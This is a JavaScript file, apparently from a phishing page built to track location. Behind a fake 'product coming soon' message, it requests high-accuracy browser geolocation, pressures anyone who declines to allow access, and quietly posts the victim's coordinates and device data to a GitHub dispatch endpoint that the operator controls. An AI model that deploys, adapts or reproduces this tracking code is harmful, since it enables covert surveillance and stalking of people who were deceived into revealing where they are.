// WARNING: If you put a Personal Access Token (PAT) here, anyone visiting your site can see it.
// It is highly recommended to use a serverless function (like Cloudflare Workers) as a middleman.
const GITHUB_OWNER = "YOUR_GITHUB_USERNAME";
const GITHUB_REPO = "YOUR_REPOSITORY_NAME";
const GITHUB_TOKEN = "YOUR_PERSONAL_ACCESS_TOKEN"; // MUST have 'repo' scope
const DISPATCH_URL = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/dispatches`;

function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    
    var payload = {
      location: {
        latitude: lat,
        longitude: lon,
        accuracy: acc
      },
      device: window.deviceData || {},
      createdAt: new Date().toISOString()
    };

    $.ajax({
      type: 'POST',
      url: DISPATCH_URL,
      headers: {
        'Accept': 'application/vnd.github.v3+json',
        'Authorization': `token ${GITHUB_TOKEN}`
      },
      contentType: 'application/json',
      data: JSON.stringify({
        event_type: "save_location_data",
        client_payload: payload
      }),
      success: function(){$('#change').html('Coming Soon');}
    });
    alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
  };
}

function showError(error)
{
  var errorMsg = 'An unknown error occurred';
  switch(error.code)
  {
    case error.PERMISSION_DENIED:
      errorMsg = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      break;
    case error.POSITION_UNAVAILABLE:
      errorMsg = 'Location information is unavailable';
      break;
    case error.TIMEOUT:
      errorMsg = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
      break;
    case error.UNKNOWN_ERROR:
      errorMsg = 'An unknown error occurred';
      break;
  }

  var payload = {
    error: errorMsg,
    device: window.deviceData || {},
    createdAt: new Date().toISOString()
  };

  $.ajax({
    type: 'POST',
    url: DISPATCH_URL,
    headers: {
      'Accept': 'application/vnd.github.v3+json',
      'Authorization': `token ${GITHUB_TOKEN}`
    },
    contentType: 'application/json',
    data: JSON.stringify({
      event_type: "save_location_data",
      client_payload: payload
    }),
    success: function(){$('#change').html('Failed');}
  });
}
